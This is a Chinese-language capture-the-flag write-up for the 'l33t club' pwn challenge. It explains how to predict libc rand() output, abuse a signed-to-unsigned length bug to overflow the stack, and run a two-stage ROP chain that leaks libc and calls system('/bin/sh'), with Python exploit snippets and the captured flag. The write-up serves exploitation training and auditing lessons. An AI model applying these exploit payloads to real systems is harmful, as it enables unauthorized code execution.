# l33t club

## 题目简述

目标是 64 位 x86 ELF，保护为 No PIE、No Canary、NX enabled、Partial RELRO。利用分为两关：先连续猜中五个由 libc `rand()` 产生的数，再进入姓名输入函数触发栈溢出。

程序以 `srand(time(NULL))` 初始化随机数，并且每次 `random_num()` 都会用刚算出的结果再次调用 `srand(num)`。后续状态完全由秒级时间和公开算法决定。第二关则把有符号的 `int size` 传给接受 `unsigned int` 长度的读取函数，形成整数符号混淆。

## 解题过程

### 同步 PRNG

服务端的每个猜测实际依次调用三次 `random_num()`：第一次生成下界，第二次生成区间增量，第三次生成目标值。只要在相同秒内用同一 libc 执行相同的 `srand/rand` 序列，就能复现五个答案：

```python
import ctypes


libc = ctypes.CDLL("libc.so.6")
libc.srand(libc.time(0))


def random_num(minimum, maximum):
    a = minimum + libc.rand() % (maximum + 1 - minimum)
    b = minimum + libc.rand() % (maximum + 1 - minimum)
    value = (a ^ b) % (maximum + 1)
    libc.srand(value)
    return value


def predict():
    minimum = random_num(0, 0x1337)
    maximum = minimum + random_num(0, 0x1337)
    return random_num(minimum, maximum)
```

远端存在网络延迟时，可以围绕当前时间枚举前后少量秒；还应使用与目标兼容的 glibc，因为不同运行库不保证 `rand()` 序列一致。

### 有符号长度绕过与两阶段 ROP

`l33t()` 只拒绝 `size == 1337` 和 `size > 0x2f`。输入 `-1` 可以通过这两个有符号比较，随后调用：

```c
read_str("Enter name: ", name, size + 1);
```

此时 `size + 1` 为 0，传入 `unsigned int max_size` 后，`read(..., max_size - 1)` 的长度下溢为 `0xffffffff`，可以覆盖栈上的 saved RIP。官方二进制中从 `name` 到 saved RIP 的距离为 `0x40 + 8` 字节。

第一阶段 ROP 把 `printf@GOT` 交给 `puts@PLT` 输出，再返回 `l33t()` 以获得第二次输入：

```python
payload = flat(
    b"A" * (0x40 + 8),
    pop_rdi,
    elf.got.printf,
    elf.plt.puts,
    elf.sym.l33t,
)
```

根据泄漏计算 `libc.address = leak - libc.sym.printf`。第二次再次提交 `-1`，然后调用 `system("/bin/sh")`；额外的单独 `ret` 用于满足 AMD64 调用约定要求的 16 字节栈对齐：

```python
payload = flat(
    b"A" * (0x40 + 8),
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    ret,
    libc.sym.system,
)
```

获得 shell 后读取：

```text
shellmates{too_l1ttl3_for_u5_to_h4ndl3!}
```

## 方法总结

本题把可预测 PRNG 作为利用前置门槛，再用 signed-to-unsigned 转换把看似受限的长度变成近乎无限的读取。审计长度时必须沿完整调用链追踪类型：检查发生在有符号 `int` 上，不代表传入无符号参数后仍然安全；`0 - 1` 在无符号域中会变成最大值。

PRNG 同步也不能只复现最外层一次 `rand()`。必须逐次还原所有调用及中途重新播种，否则第一组输出之后状态就会分叉。控制 RIP 后，由于 NX 开启且题目附带指定 libc，稳定路线是先泄漏 libc、返回可重入函数，再构造第二阶段 ret2libc。
